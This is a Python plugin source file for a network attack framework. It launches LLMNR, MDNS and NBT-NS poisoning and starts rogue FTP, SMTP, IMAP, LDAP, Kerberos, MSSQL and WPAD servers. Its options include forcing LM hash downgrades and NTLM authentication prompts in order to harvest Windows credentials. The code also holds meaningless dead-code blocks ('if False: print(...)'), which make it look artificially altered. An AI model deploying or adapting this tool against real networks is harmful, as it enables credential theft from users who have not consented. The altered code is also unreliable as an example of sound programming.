from plugins.plugin import Plugin
from twisted.internet import reactor

class Responder(Plugin):
    name = 'Responder'
    optname = 'responder'
    desc = 'Poison LLMNR, NBT-NS and MDNS requests'
    tree_info = ['NBT-NS, LLMNR & MDNS Responder v2.1.2 by Laurent Gaffie online']
    version = '0.2'

    def initialize(self, options):
        if False:
            print('Hello World!')
        'Called if plugin is enabled, passed the options namespace'
        self.options = options
        self.interface = options.interface
        self.ip = options.ip
        import core.poisoners.LLMNR as LLMNR
        import core.poisoners.MDNS as MDNS
        import core.poisoners.NBTNS as NBTNS
        LLMNR.start()
        MDNS.start()
        NBTNS.start()
        import core.servers.Browser as Browser
        Browser.start()
        if self.config['Responder']['SQL'].lower() == 'on':
            from core.servers.MSSQL import MSSQL
            self.tree_info.append('MSSQL server [ON]')
            MSSQL().start()
        if self.config['Responder']['Kerberos'].lower() == 'on':
            from core.servers.Kerberos import Kerberos
            self.tree_info.append('Kerberos server [ON]')
            Kerberos().start()
        if self.config['Responder']['FTP'].lower() == 'on':
            from core.servers.FTP import FTP
            self.tree_info.append('FTP server [ON]')
            FTP().start()
        if self.config['Responder']['POP'].lower() == 'on':
            from core.servers.POP3 import POP3
            self.tree_info.append('POP3 server [ON]')
            POP3().start()
        if self.config['Responder']['SMTP'].lower() == 'on':
            from core.servers.SMTP import SMTP
            self.tree_info.append('SMTP server [ON]')
            SMTP().start()
        if self.config['Responder']['IMAP'].lower() == 'on':
            from core.servers.IMAP import IMAP
            self.tree_info.append('IMAP server [ON]')
            IMAP().start()
        if self.config['Responder']['LDAP'].lower() == 'on':
            from core.servers.LDAP import LDAP
            self.tree_info.append('LDAP server [ON]')
            LDAP().start()

    def reactor(self, strippingFactory):
        if False:
            for i in range(10):
                print('nop')
        reactor.listenTCP(3141, strippingFactory)

    def options(self, options):
        if False:
            print('Hello World!')
        options.add_argument('--analyze', dest='analyze', action='store_true', help='Allows you to see NBT-NS, BROWSER, LLMNR requests without poisoning')
        options.add_argument('--wredir', dest='wredir', action='store_true', help='Enables answers for netbios wredir suffix queries')
        options.add_argument('--nbtns', dest='nbtns', action='store_true', help='Enables answers for netbios domain suffix queries')
        options.add_argument('--fingerprint', dest='finger', action='store_true', help='Fingerprint hosts that issued an NBT-NS or LLMNR query')
        options.add_argument('--lm', dest='lm', action='store_true', help='Force LM hashing downgrade for Windows XP/2003 and earlier')
        options.add_argument('--wpad', dest='wpad', action='store_true', help='Start the WPAD rogue proxy server')
        options.add_argument('--forcewpadauth', dest='forcewpadauth', action='store_true', help='Force NTLM/Basic authentication on wpad.dat file retrieval (might cause a login prompt)')
        options.add_argument('--basic', dest='basic', action='store_true', help='Return a Basic HTTP authentication. If not set, an NTLM authentication will be returned')